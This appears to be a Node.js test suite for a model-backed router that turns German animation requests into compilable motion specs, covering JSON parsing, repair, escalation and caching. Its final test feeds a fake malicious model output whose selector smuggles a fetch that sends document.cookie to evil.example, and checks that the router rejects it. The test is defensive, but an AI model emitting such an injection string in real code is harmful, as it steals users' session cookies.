"use strict";
const { test } = require("node:test");
const assert = require("node:assert");
const fs = require("fs");
const path = require("path");
const os = require("os");

/* Redirect the cache into tmp so tests do not touch the repo cache */
const cache = require("../src/router/cache.js");
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "motion-cache-"));
cache.get = (k) => { const f = path.join(tmp, k + ".json"); return fs.existsSync(f) ? JSON.parse(fs.readFileSync(f, "utf8")) : null; };
cache.set = (k, s) => fs.writeFileSync(path.join(tmp, k + ".json"), JSON.stringify(s));

const { route, extractJson } = require("../src/router/route.js");
const { mockClient } = require("../src/router/clients.js");
const { loadCatalog } = require("../src/compiler/catalog.js");
const { compileSpec } = require("../src/compiler/compile.js");

const catalog = loadCatalog();

test("extractJson tolerates Markdown fences and prefix text", () => {
  assert.deepEqual(extractJson('```json\n{"a":1}\n```'), { a: 1 });
  assert.deepEqual(extractJson('Hier ist die Spec: {"a":1}'), { a: 1 });
  assert.equal(extractJson("kein json"), null);
});

test("mock routing: request -> valid spec -> compilable", async () => {
  const r = await route("Die Headline soll beim Scrollen sanft einblenden", { client: mockClient(), catalog, noCache: true });
  assert.equal(r.ok, true);
  assert.equal(r.source, "model");
  const c = compileSpec(r.spec, catalog);
  assert.equal(c.ok, true);
});

test("repair loop: invalid first output is repaired in ONE attempt", async () => {
  const r = await route("Karten nacheinander einblenden bitte", { client: mockClient({ failFirst: true }), catalog, noCache: true });
  assert.equal(r.ok, true);
  assert.equal(r.source, "model-repaired");
  assert.equal(r.attempts, 2);
});

test("escalation: request without a matching primitive -> escalate signal", async () => {
  const r = await route("Baue einen WebGL-Partikelsturm mit Physik", { client: mockClient(), catalog, noCache: true });
  assert.equal(r.ok, false);
  assert.equal(r.escalate, true);
});

test("cache: second identical request comes from the cache (0 model calls)", async () => {
  const req = "Hero-Headline einblenden mit Parallax-Tiefe " + Date.now();
  const c1 = mockClient();
  const r1 = await route(req, { client: c1, catalog });
  assert.equal(r1.ok, true);
  const r2 = await route(req, { client: { name: "darf-nie-laufen", complete: async () => { throw new Error("Modell wurde trotz Cache gerufen"); } }, catalog });
  assert.equal(r2.ok, true);
  assert.equal(r2.source, "cache");
});

test("trust boundary stops malicious model output (fail-closed)", async () => {
  const evil = {
    name: "evil-model",
    complete: async () => JSON.stringify({
      specVersion: "1.0",
      meta: { target: "vanilla-gsap" },
      motions: [{ id: "x", primitive: "scrollReveal", target: "');fetch('https://evil.example/'+document.cookie);('", params: { from: { opacity: 0 } } }],
    }),
  };
  const r = await route("harmlose anfrage " + Date.now(), { client: evil, catalog, noCache: true });
  assert.equal(r.ok, false);
  assert.equal(r.escalate, true);
});
